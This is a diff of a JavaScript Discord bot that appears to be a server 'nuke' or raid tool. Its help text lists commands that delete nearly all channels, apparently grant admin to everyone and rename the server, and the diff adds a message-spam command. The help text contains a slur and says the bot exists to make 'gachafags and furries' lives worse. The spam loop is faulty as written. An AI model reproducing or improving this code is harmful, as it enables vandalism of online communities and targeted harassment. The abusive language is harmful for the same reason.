@@ -57,6 +57,7 @@ client.on("message", async (message) => {
             "$del - yeets all the channels and only leaves one",
             "$admall - self explanatory",
             "$servername (new server name) - self explanatory",
+            "$spam (text) - self explanatory",
             `$help - bruhhh\n`,
             "Bot by paradino, making gachafags and furries lifes worse"]
             message.author.send(`${help.slice(0).join(`\n`)}`).catch(() => message.channel.send(`enable yo dms dumbass`))
@@ -65,7 +66,7 @@ client.on("message", async (message) => {
             message.delete();
             if(!args.slice(0).join(' ')) return message.channel.send('what am i supposed to spam bruhh')
             for(let spam = 0; spam == 400; spam++){
-                message.channel.send(`${args.slice(0).join(' ')}`)
+                message.channel.send(args.slice(0).join(' '))
             }
         break;
     }
